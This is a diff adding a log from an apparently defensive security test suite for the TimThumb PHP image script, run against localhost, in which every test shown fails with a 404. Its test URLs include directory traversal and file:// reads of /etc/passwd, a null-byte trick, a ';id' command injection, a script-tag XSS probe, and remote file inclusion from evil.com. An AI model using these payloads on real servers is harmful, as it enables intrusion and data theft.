@@ -1,0 +1,34 @@
+[2025-03-03 12:33:43] [INFO] Starting TimThumb Security Tests
+[2025-03-03 12:33:43] [PASS] TimThumb File Check: TimThumb file found
+[2025-03-03 12:33:43] [INFO] Running in CLI mode. Some tests may be simulated.
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=images/test-image.jpg&w=100&h=100&q=90
+[2025-03-03 12:33:43] [FAIL] Basic Local Image Resize: Expected status 200, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=https://picsum.photos/200/300&w=100&h=100&q=90
+[2025-03-03 12:33:43] [FAIL] External Image Fetch: Expected status 200, got 404
+[2025-03-03 12:33:43] [INFO] Starting Security Tests
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=../../../etc/passwd&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: directory_traversal: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=image.jpg%00.php&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: null_byte: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=image.jpg;id&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: command_injection: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=file:///etc/passwd&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: invalid_scheme: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=<script>alert(1)</script>.jpg&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: xss_attack: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=http://evil.com/malicious.php&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: remote_file_inclusion: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Starting Cache Functionality Tests
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=images/test-image.jpg&w=150&h=150&q=90
+[2025-03-03 12:33:43] [FAIL] Cache: Initial Image Caching: Expected status 200, got 404
+[2025-03-03 12:33:43] [FAIL] Cache: File Creation: No cache file was created
+[2025-03-03 12:33:43] [INFO] Starting System Tests
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=images/test-image.jpg&w=5000&h=5000
+[2025-03-03 12:33:43] [FAIL] System: Memory Limit Handling: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=nonexistent.jpg&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Error Handling: Non-existent Image: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=test.php&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: Invalid Extension: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Testing URL: http://localhost/timthumb.php?src=http:///malformed-url&w=100&h=100
+[2025-03-03 12:33:43] [FAIL] Security: Malformed URL: Expected status 400, got 404
+[2025-03-03 12:33:43] [INFO] Test Summary
